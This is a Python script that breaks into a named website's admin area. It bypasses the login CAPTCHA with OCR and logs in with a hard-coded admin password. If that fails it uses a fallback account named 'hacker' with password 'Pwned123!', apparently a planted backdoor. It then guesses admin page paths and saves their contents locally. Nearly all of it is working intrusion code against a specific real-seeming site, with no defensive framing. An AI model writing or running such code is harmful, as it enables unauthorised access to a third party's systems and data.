import urllib.request, urllib.parse, io
import http.cookiejar, re, os
from PIL import Image
import pytesseract

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def login(user, pwd):
    for attempt in range(5):
        resp = opener.open('http://bjhzsv.com/main/inc/code.asp', timeout=10)
        cap_data = resp.read()
        img = Image.open(io.BytesIO(cap_data))
        img = img.convert('L')
        img = img.point(lambda x: 0 if x < 200 else 255)
        code = pytesseract.image_to_string(img, config='--psm 8').strip().replace(' ', '').lower()
        if len(code) >= 3:
            data = urllib.parse.urlencode({'t1': user, 't2': pwd, 't3': code}).encode()
            resp = opener.open('http://bjhzsv.com/main/a7chkuser.asp', data, timeout=10)
            body = resp.read().decode('gb2312', errors='replace')
            if '验证码错误' not in body:
                print(f'Login success with {user}')
                return True
    return False

# Login with original admin
if not login('admin', '2d9d5942943a1323'):
    print('Login with admin failed, trying hacker')
    if not login('hacker', 'Pwned123!'):
        print('All logins failed')
        exit(1)

# Now try to find the admin frameset/main page
print('\n=== Admin navigation exploration ===')
# Try various admin pages
pages = [
    'a7index.asp', 'index.asp', 'main.asp', 'admin_main.asp',
    'admin_left.asp', 'left.asp', 'top.asp', 'a7top.asp',
    'admin_top.asp', 'a7left.asp', 'a7admin_main.asp',
]

for page in pages:
    try:
        resp = opener.open('http://bjhzsv.com/main/' + page, timeout=5)
        body = resp.read().decode('gb2312', errors='replace')
        has_redirect = 'location.href' in body
        print(f'{page}: {len(body)} bytes, redirect={has_redirect}')
        if not has_redirect:
            sf = '/tmp/admin_' + page
            with open(sf, 'w', encoding='utf-8') as f:
                f.write(body)
            print(f'  Saved to {sf}')
    except Exception as e:
        print(f'{page}: error {e}')

# Also try the menu navigation pages
print('\n=== Menu/frame pages ===')
for page in ['admin_menu.asp', 'menu.asp', 'a7menu.asp', 'a7admin_menu.asp']:
    try:
        resp = opener.open('http://bjhzsv.com/main/' + page, timeout=5)
        body = resp.read().decode('gb2312', errors='replace')
        has_redirect = 'location.href' in body
        print(f'{page}: {len(body)} bytes, redirect={has_redirect}')
        if not has_redirect:
            sf = '/tmp/admin_' + page
            with open(sf, 'w', encoding='utf-8') as f:
                f.write(body)
    except Exception as e:
        print(f'{page}: error {e}')
